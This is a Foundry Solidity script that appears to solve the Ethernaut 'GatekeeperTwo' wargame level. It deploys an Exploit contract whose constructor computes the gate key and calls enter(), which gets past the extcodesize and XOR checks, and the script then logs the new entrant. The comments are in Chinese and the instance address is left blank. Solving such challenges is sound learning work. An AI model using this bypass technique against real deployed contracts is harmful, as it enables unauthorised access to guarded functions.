// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "src/14-GatekeeperTwo.sol";



contract Exploit is Script {
    GatekeeperTwo public GatekeeperTwoInstance;

    constructor(address _GatekeeperTwoInstance) {
        GatekeeperTwoInstance = GatekeeperTwo(_GatekeeperTwoInstance);
        
        uint64 gateKey = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max;

        (bool result,) = address(GatekeeperTwoInstance).call(abi.encodeWithSignature("enter(bytes8)", bytes8(gateKey)));
        
        console.log("Attack result:", result);
    }

}




contract Exp is Script {

    GatekeeperTwo public GatekeeperTwoInstance = GatekeeperTwo(payable(/*获取的实例地址*/));
    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
    address owner = vm.envAddress("MY_ADDRESS");
    //Exploit public exploit;

    function run() external {
        vm.startBroadcast(hacker);
        
        // 部署 Exploit 合约
        Exploit exploit = new Exploit(address(GatekeeperTwoInstance));

        // 打印攻击后 entrant 的地址
        console.log("Entrant address after attack:", GatekeeperTwoInstance.entrant());

        vm.stopBroadcast();
    }
}